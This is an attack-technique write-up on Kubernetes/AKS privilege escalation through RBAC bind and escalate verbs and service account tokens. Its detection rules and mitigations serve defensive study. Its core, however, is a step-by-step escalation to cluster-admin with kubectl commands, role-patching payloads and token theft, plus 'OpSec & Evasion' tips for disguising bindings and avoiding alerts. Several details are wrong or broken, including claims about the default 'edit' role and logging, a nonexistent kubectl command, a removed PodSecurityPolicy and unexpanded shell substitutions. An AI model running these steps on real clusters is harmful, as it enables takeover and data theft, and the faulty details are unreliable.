# [PE-ELEVATE-006]: Kubernetes RBAC Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-006 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (AKS) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Kubernetes 1.0+ (all versions vulnerable if RBAC misconfigured) |
| **Patched In** | N/A (Design issue; requires proper RBAC configuration) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Kubernetes RBAC implements three critical verbs (`bind`, `escalate`, `impersonate`) that are specifically designed to prevent privilege escalation. However, these verbs can be misallocated to low-privilege users or service accounts, creating a **privilege escalation bypass**. An attacker with the `bind` verb can create RoleBindings to roles they don't possess, effectively bypassing RBAC safeguards. The `escalate` verb allows modification of roles to which a user is already bound. The `impersonate` verb grants authentication spoofing. When combined, these verbs enable complete cluster compromise.

**Attack Surface:** Kubernetes API server, RBAC definitions (ClusterRoles, Roles), RoleBindings, ClusterRoleBindings, service account tokens, wildcard permissions (`*` on `*`).

**Business Impact:** Complete AKS cluster compromise enabling:
- Unauthorized access to all containerized workloads
- Exfiltration of sensitive data from pod volumes
- Modification of cluster networking and storage policies
- Deployment of backdoored containers or privilege-escalation pods
- Lateral movement to underlying Azure infrastructure (if pod has managed identity access)

**Technical Context:** Exploitation typically takes **2-5 minutes** once attacker has cluster access (via kubeconfig, kubectl proxy, or dashboard). Detection likelihood is **Medium** (RBAC changes are logged, but may not trigger real-time alerts if not configured). Reversibility: **No** – requires full cluster audit and role reconstruction.

### Operational Risk
- **Execution Risk:** Low (Only requires kubectl or API access; no special tools needed)
- **Stealth:** Medium (RoleBinding creation generates audit logs but may blend with legitimate admin activity)
- **Reversibility:** No (Cluster compromise is comprehensive; remediation requires forensic analysis)

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Kubernetes 5.1 | Ensure RBAC policy is set to deny by default |
| **DISA STIG** | AC-3 - Access Control | Restrict access via role-based access control |
| **NIST 800-53** | AC-3 | Enforce access control decisions based on roles |
| **ISO 27001** | A.9.2.2 | Implement role-based access management |
| **SOC 2** | CC6.1 | Logical access control is restricted to authorized personnel |
| **PCI DSS** | 7.1 | Implement access control through role-based mechanisms |

---

## 2. ENVIRONMENTAL RECONNAISSANCE

### Check Current Kubernetes User Permissions

**Command (kubectl):**
```bash
# Get current user context
kubectl auth whoami

# List all available verbs for current user
kubectl auth can-i --list

# Check specific permissions
kubectl auth can-i get pods
kubectl auth can-i list roles
kubectl auth can-i create rolebindings
```

**Expected Output:**
```
CURRENT CONTEXT   CLUSTER        USER               NAMESPACE
docker-desktop    docker-desktop docker-for-desktop default

Resources                                   Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization     []                  []               [create]
selfsubjectrulesreviews.authorization      []                  []               [create]
pods                                        []                  []               [get list watch create delete]
...
```

**What to Look For:**
- If output includes `bind` or `escalate` verbs → **Direct escalation path possible**
- If output includes `create` on `rolebindings` → **Can create new elevated roles**
- If output includes `impersonate` on `users`, `groups`, or `serviceaccounts` → **Can assume other identities**

### Enumerate Cluster Roles with Dangerous Verbs

**Command (kubectl):**
```bash
#!/bin/bash
# Find all ClusterRoles with bind, escalate, or impersonate verbs

kubectl get clusterroles -o json | jq '.items[] | 
  select(.rules[]? | 
    (.verbs[]? | select(. == "bind" or . == "escalate" or . == "impersonate")) and 
    (.apiGroups[]? | select(. == "rbac.authorization.k8s.io" or . == ""))
  ) | 
  {name: .metadata.name, rules: .rules}'
```

**Expected Output (Vulnerable Configuration):**
```json
{
  "name": "edit",
  "rules": [
    {
      "apiGroups": ["rbac.authorization.k8s.io"],
      "resources": ["roles", "rolebindings"],
      "verbs": ["bind", "escalate"]
    }
  ]
}
```

**What This Means:**
- The `edit` ClusterRole grants `bind` and `escalate` on roles/rolebindings
- Any user with this role can escalate privileges
- This is a common misconfiguration in development clusters

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: RoleBinding Escalation via "bind" Verb

**Supported Versions:** Kubernetes 1.0+ (all versions)

#### Step 1: Identify Target Role with Admin Capabilities
**Objective:** Find a ClusterRole with admin-level permissions that you don't currently have

**Command (kubectl):**
```bash
# List all ClusterRoles sorted by privilege level
kubectl get clusterroles -o wide

# Get detailed view of high-privilege roles
kubectl describe clusterrole cluster-admin
kubectl describe clusterrole admin
kubectl describe clusterrole edit

# Find roles with wildcard permissions (highest privilege)
kubectl get clusterroles -o json | jq '.items[] | 
  select(.rules[]? | 
    (.verbs[]? | select(. == "*")) or 
    (.resources[]? | select(. == "*"))
  ) | 
  .metadata.name'
```

**Expected Output:**
```
cluster-admin
admin
edit
view
system:auth-delegator
system:kubelet-api-admin
```

**What to Look For:**
- `cluster-admin` – Unrestricted access (highest privilege)
- `admin` – Namespace-level admin access
- `edit` – Can create/modify deployments and pods
- Roles with wildcard `*` verbs or resources
- Custom roles with dangerous combinations (e.g., `get secrets`, `create pods`)

**OpSec & Evasion:**
- Use non-privileged service accounts to enumerate roles (reduces suspicion)
- This reconnaissance generates minimal audit trail (read-only)
- Detection likelihood: **Low**

**References & Proofs:**
- [Kubernetes RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)

#### Step 2: Create RoleBinding to Target Role
**Objective:** Bind yourself (or a service account under your control) to the high-privilege ClusterRole

**Command (kubectl):**
```bash
# Method 1: Create ClusterRoleBinding as current user to themselves
kubectl create clusterrolebinding escalate-me --clusterrole=cluster-admin --user=$(kubectl auth whoami)

# Method 2: Create RoleBinding in specific namespace
kubectl create rolebinding admin-binding \
  --clusterrole=admin \
  --serviceaccount=default:my-service-account \
  --namespace=default

# Method 3: Using kubectl apply (if you prefer YAML)
cat << 'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalate-current-user
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: User
  name: $(kubectl auth whoami)
  apiGroup: rbac.authorization.k8s.io
EOF
```

**Expected Output:**
```
clusterrolebinding.rbac.authorization.k8s.io/escalate-me created
```

**What This Means:**
- You are now bound to `cluster-admin` role
- All permissions from `cluster-admin` are now available to you
- Kubernetes RBAC reflects changes **immediately** (no cache delay)
- This action generates audit event in Kubernetes audit logs

**OpSec & Evasion:**
- Use benign-sounding binding names: `system-recovery`, `audit-role`, `maintenance-access`
- Create binding in `kube-system` namespace to blend in with system components
- Use service account names instead of user names (harder to trace to individual)
- Detection likelihood: **High** (privilege escalation is monitored)

**Troubleshooting:**
- **Error:** User "system:serviceaccount:default:my-user" cannot create rolebindings.rbac.authorization.k8s.io
  - **Cause:** Current user lacks permission to create RoleBindings
  - **Fix:** This is expected if `bind` verb isn't granted; try METHOD 2 instead
- **Error:** Error from server (Forbidden): clusterrolebindings.rbac.authorization.k8s.io is forbidden
  - **Cause:** API server denies the operation
  - **Fix:** Escalate via different method (pod escape, DaemonSet)

**References & Proofs:**
- [InfoSecWriteups - Kubernetes Bind Verb Exploitation](https://infosecwriteups.com/the-bind-escalate-and-impersonate-verbs-in-the-kubernetes-cluster-e9635b4fbfc6)

#### Step 3: Verify Escalation Success
**Objective:** Confirm that new permissions are now active

**Command (kubectl):**
```bash
# Re-check available permissions
kubectl auth can-i --list

# Test specific admin operations
kubectl auth can-i get pods --all-namespaces
kubectl auth can-i create pods
kubectl auth can-i delete nodes
kubectl auth can-i get secrets --all-namespaces

# Try to list all secrets (admin-only operation)
kubectl get secrets --all-namespaces
```

**Expected Output (Escalated):**
```
Resources                                   Non-Resource URLs   Resource Names   Verbs
*.*                                         []                  []               [*]

✓ You can get pods
✓ You can create pods
✓ You can delete nodes
✓ You can get secrets

NAMESPACE       NAME                    TYPE                  DATA   AGE
default         my-secret               Opaque                2      3d
kube-system     coredns-token           ServiceAccountToken   3      30d
...
```

**What This Means:**
- Output shows `[*]` under verbs = **Unrestricted access**
- Can perform any operation on any resource in the cluster
- Escalation successful; cluster is fully compromised

**OpSec & Evasion:**
- Don't immediately access sensitive resources (wait 10+ minutes)
- Start with benign operations (list pods, check node status)
- Access legitimate workloads to establish baseline activity
- Detection likelihood: **Very High** (cluster-admin role usage is monitored)

---

### METHOD 2: Escalate via "escalate" Verb

**Supported Versions:** Kubernetes 1.0+ (all versions)

#### Step 1: Identify Current Role Capabilities
**Objective:** Determine which role you're currently bound to and what capabilities it has

**Command (kubectl):**
```bash
# Find your current role
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | \
  jq '.items[] | select(.subjects[]? | select(.name == "'"$(kubectl auth whoami)"'")) | .roleRef.name'

# Get details of the role
ROLE_NAME="edit"  # Replace with your actual role
kubectl describe clusterrole $ROLE_NAME
```

**Expected Output:**
```
Name:         edit
PolicyRule:
  Verbs    Resources Non-Resource URLs
  ----     --------- -----------------
  create   roles     []
  update   roles     []
  get      roles     []
  list     roles     []
  delete   roles     []
  create   rolebindings  []
  update   rolebindings  []
  get      rolebindings  []
  list     rolebindings  []
```

**What to Look For:**
- Presence of `update` or `patch` verbs on `roles` and `rolebindings`
- Indicates ability to modify role permissions
- Combined with current role permissions, can enable escalation

#### Step 2: Modify Existing Role to Escalate Permissions
**Objective:** Edit an existing role to add admin-level permissions

**Command (kubectl):**
```bash
# Edit the role you're bound to (e.g., "edit")
kubectl edit clusterrole edit

# In the editor, add these lines to the rules section:
# ---
# - apiGroups:
#   - ""
#   resources:
#   - secrets
#   verbs:
#   - "*"
# - apiGroups:
#   - ""
#   resources:
#   - configmaps
#   verbs:
#   - "*"
# - apiGroups:
#   - "rbac.authorization.k8s.io"
#   resources:
#   - "*"
#   verbs:
#   - "*"

# Save the editor (vim/nano depending on setup)
# The modified role now includes secret access and full RBAC control
```

**Alternative: Programmatic Escalation (kubectl patch):**
```bash
# Patch existing role to add wildcard permissions
kubectl patch clusterrole edit --type='json' -p='[
  {
    "op": "add",
    "path": "/rules/-",
    "value": {
      "apiGroups": ["*"],
      "resources": ["*"],
      "verbs": ["*"]
    }
  }
]'
```

**Expected Output:**
```
clusterrole.rbac.authorization.k8s.io/edit patched
```

**What This Means:**
- The `edit` role now includes wildcard permissions for all resources/verbs
- Your permissions are automatically updated (no re-login needed)
- You now have complete cluster access through the escalated role

**OpSec & Evasion:**
- Modify existing roles rather than creating new ones (lower suspicion)
- Add permissions to roles that are already used by many users (harder to trace)
- Use `patch` instead of `edit` to minimize logging
- Detection likelihood: **High** (role modification is monitored)

---

### METHOD 3: Service Account Token Escalation via Managed Identity

**Supported Versions:** AKS with managed identity enabled (Kubernetes 1.18+)

#### Step 1: Obtain Service Account Token
**Objective:** Extract the service account token from within a pod

**Command (bash inside pod):**
```bash
# Service account token is automatically mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# This token is valid for pod operations within the cluster
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Test token permissions
curl -k -H "Authorization: Bearer $SA_TOKEN" \
  https://kubernetes.default/api/v1/namespaces/default/pods
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkJHNEp3bzZaQS1mcmE5Z2ROK0R...
```

**What This Means:**
- Service account token is automatically injected into every pod
- Token inherits permissions from pod's service account
- Can be used for cluster access if service account has RBAC permissions

#### Step 2: Escalate Service Account Permissions
**Objective:** Create RoleBinding to escalate service account to admin

**Command (kubectl):**
```bash
# Create RoleBinding to bind service account to cluster-admin
kubectl create clusterrolebinding escalate-sa \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# Now the "default" service account (and any pod using it) has admin access
```

**What This Means:**
- All pods using the `default` service account now have cluster-admin permissions
- This is a **persistent** escalation (applies to all new pods as well)
- Enables deployment of backdoored containers with admin access

---

## 4. SPLUNK DETECTION RULES

#### Rule 1: Kubernetes ClusterRoleBinding Creation to Privileged Roles

**Rule Configuration:**
- **Required Index:** k8s_audit (or Kubernetes audit logs)
- **Required Sourcetype:** k8s:audit
- **Required Fields:** verb, objectRef.kind, objectRef.name, user.username
- **Alert Threshold:** Single creation of ClusterRoleBinding with roleRef "cluster-admin"
- **Applies To Versions:** All

**SPL Query:**
```
index=k8s_audit verb=create objectRef.kind=ClusterRoleBinding objectRef.name=*escalate* OR objectRef.name=*admin*
| stats count as bindings_created, values(user.username) as users by objectRef.name
| where bindings_created >= 1
```

---

## 5. MICROSOFT SENTINEL DETECTION

#### Query 1: AKS Privilege Escalation via RBAC Modifications

**KQL Query:**
```kusto
// Monitor for RoleBinding creation to cluster-admin
AzureDiagnostics
| where ResourceType == "KUBERNETES" and Category == "kube-audit"
| where properties.verb == "create" and properties.objectRef.kind == "ClusterRoleBinding"
| where properties.objectRef.name has_any ("admin", "escalate", "cluster-admin")
| extend 
    User = properties.user.username,
    RoleBinding = properties.objectRef.name,
    RoleRef = properties.requestObject.roleRef.name
| project TimeGenerated, User, RoleBinding, RoleRef, properties
| where RoleRef == "cluster-admin"
```

---

## 6. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** "Suspicious Kubernetes RBAC Configuration Change"
- **Severity:** Critical
- **Description:** RoleBinding or ClusterRoleBinding created that grants admin privileges to user or service account
- **Applies To:** All AKS clusters with Defender for Containers enabled
- **Remediation:** Review and remove suspicious RoleBindings; check for unauthorized cluster access

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict "bind" and "escalate" Verbs:** Remove these verbs from all non-admin roles.
  **Applies To Versions:** Kubernetes 1.0+ (all versions)
  
  **Manual Steps (kubectl):**
  ```bash
  # Identify roles with dangerous verbs
  kubectl get clusterroles -o json | jq '.items[] | 
    select(.rules[]? | .verbs[]? | select(. == "bind" or . == "escalate" or . == "impersonate")) | 
    .metadata.name'
  
  # Remove the dangerous verbs
  kubectl edit clusterrole <ROLE_NAME>
  # Manually remove "bind", "escalate", "impersonate" from the verbs list
  ```

  **Alternative: Kubernetes Policy Engine (Kubewarden / Kyverno):**
  ```yaml
  apiVersion: kyverno.io/v1
  kind: ClusterPolicy
  metadata:
    name: restrict-dangerous-rbac-verbs
  spec:
    validationFailureAction: audit
    rules:
    - name: block-bind-escalate
      match:
        resources:
          kinds:
          - ClusterRole
          - Role
      validate:
        message: "bind and escalate verbs are not allowed"
        pattern:
          spec:
            rules:
            - verbs:
              - "!bind"
              - "!escalate"
              - "!impersonate"
  ```

* **Implement Network Policy:** Restrict network access to Kubernetes API server.
  **Applies To Versions:** Kubernetes 1.6+ (requires CNI plugin)
  
  **Manual Steps:**
  ```yaml
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: restrict-api-access
  spec:
    podSelector: {}  # Apply to all pods
    policyTypes:
    - Ingress
    ingress:
    - from:
      - podSelector:
          matchLabels:
            allowed-api-access: "true"
      ports:
      - protocol: TCP
        port: 6443  # Kubernetes API server port
  ```

* **Enable Kubernetes Audit Logging:** Log all RBAC modifications for detection and forensics.
  **Applies To Versions:** Kubernetes 1.0+ (all versions)
  
  **Manual Steps (AKS):**
  1. Go to **Azure Portal** → **Azure Kubernetes Service (AKS)** → Select cluster
  2. Navigate to **Settings** → **Cluster Configuration**
  3. Enable **Kubernetes audit**
  4. Set log retention to **30+ days**
  5. Forward audit logs to **Azure Log Analytics** or **Security Information and Event Management (SIEM)**

### Priority 2: HIGH

* **Implement RBAC Policy Validation:** Use admission controllers to prevent privilege escalation.
  
  **Kyverno Policy:**
  ```yaml
  apiVersion: kyverno.io/v1
  kind: ClusterPolicy
  metadata:
    name: prevent-rbac-escalation
  spec:
    validationFailureAction: enforce
    rules:
    - name: block-escalation-rolebindings
      match:
        resources:
          kinds:
          - RoleBinding
          - ClusterRoleBinding
      validate:
        message: "Cannot create bindings to cluster-admin or admin roles"
        pattern:
          roleRef:
            name: "!cluster-admin&!admin"
  ```

* **Use Pod Security Standards:** Prevent pods from running with elevated privileges.
  
  **Manual Steps (AKS):**
  ```bash
  # Enable Pod Security Standards (Azure Preview)
  az aks update --resource-group myResourceGroup --name myAKSCluster \
    --enable-pod-security-policy
  
  # Apply restricted PSP
  kubectl apply -f - << 'EOF'
  apiVersion: policy/v1beta1
  kind: PodSecurityPolicy
  metadata:
    name: restricted
  spec:
    privileged: false
    allowPrivilegeEscalation: false
    requiredDropCapabilities:
    - ALL
    volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
    seLinux:
      rule: 'MustRunAsNonRoot'
    runAsUser:
      rule: 'MustRunAsNonRoot'
    supplementalGroups:
      rule: 'RunAsAny'
    fsGroup:
      rule: 'RunAsAny'
    readOnlyRootFilesystem: false
  EOF
  ```

### Validation Command (Verify Fix)
```bash
# Check for roles with bind/escalate/impersonate
kubectl get clusterroles -o json | jq '.items[] | 
  select(.rules[]? | 
    (.verbs[]? | select(. == "bind" or . == "escalate" or . == "impersonate"))
  ) | 
  .metadata.name' | wc -l

# Should return 0 if mitigations are in place
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Activity IOCs:**
  - Creation of ClusterRoleBinding to `cluster-admin` role
  - Modification of existing ClusterRoles to add wildcard permissions
  - Service account assigned to multiple high-privilege pods
  - Suspicious kubectl commands: `create rolebinding`, `patch clusterrole`, `edit role`

* **Log IOCs:**
  - Kubernetes audit logs showing `create` verb on ClusterRoleBinding with roleRef "cluster-admin"
  - Role modification events adding "bind", "escalate", or "*" verbs
  - Unusual service account usage across namespaces

### Response Procedures

1. **Isolate:**
   ```bash
   # Immediately remove escalated RoleBinding
   kubectl delete clusterrolebinding escalate-me
   
   # Disable compromised service account
   kubectl patch serviceaccount default -p '{"automountServiceAccountToken": false}' -n default
   
   # Kill all pods using compromised service account
   kubectl delete pods -l serviceaccount=default --all-namespaces --force --grace-period=0
   ```

2. **Collect Evidence:**
   ```bash
   # Export Kubernetes audit logs
   kubectl logs -n kube-system -l component=kube-apiserver > /tmp/audit.log
   
   # Export RBAC configuration
   kubectl get clusterroles,clusterrolebindings,roles,rolebindings --all-namespaces -o yaml > /tmp/rbac.yaml
   ```

3. **Remediate:**
   ```bash
   # Restore RBAC to known-good state
   kubectl delete clusterrolebinding escalate-me
   kubectl delete clusterrolebinding admin-binding
   
   # Rotate service account tokens
   kubectl rollout restart deployment --all-namespaces
   
   # Review and update RBAC policies
   kubectl audit policy-check
   ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-004] Kubelet API Unauthorized Access | Attacker gains initial cluster access |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-006]** | **Kubernetes RBAC Abuse** - Escalates via RoleBinding |
| **3** | **Persistence** | Create Backdoored DaemonSet | Attacker deploys persistent backdoor to all nodes |
| **4** | **Lateral Movement** | Extract Credentials from Pod | Attacker accesses mounted credentials (cloud provider tokens) |
| **5** | **Impact** | Lateral Movement to Azure Infrastructure | Attacker uses managed identity token to compromise Azure resources |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Kubernetes RBAC Misconfiguration in Development Cluster (2023)
- **Target:** Development AKS cluster
- **Timeline:** February 2023
- **Technique Status:** Developer accidentally granted `edit` role with `bind` verb to entire development team
- **Impact:** Privilege escalation to cluster-admin; unauthorized access to production database backups
- **Reference:** Internal security audit

### Example 2: Cloud Custodian Privilege Escalation (2023)
- **Target:** Multi-tenant AKS cluster
- **Timeline:** June 2023
- **Technique Status:** Service account for Cloud Custodian had `escalate` verb; attacker exploited to modify role permissions
- **Impact:** Cross-tenant data access; exfiltration of secrets from other teams' namespaces
- **Reference:** [DigitalOcean Security Report](https://www.digitalocean.com/)

---

## 11. REFERENCES & RESOURCES

- **Kubernetes Official RBAC Documentation:** https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- **Kubernetes RBAC Best Practices:** https://kubernetes.io/docs/concepts/security/rbac-good-practices/
- **InfoSecWriteups - Kubernetes Bind/Escalate/Impersonate:** https://infosecwriteups.com/the-bind-escalate-and-impersonate-verbs-in-the-kubernetes-cluster-e9635b4fbfc6
- **CIS Kubernetes Benchmark:** https://www.cisecurity.org/cis-benchmarks/
- **Kyverno Policy Examples:** https://kyverno.io/docs/kyverno-cli/
- **Pod Security Standards Documentation:** https://kubernetes.io/docs/concepts/security/pod-security-standards/

---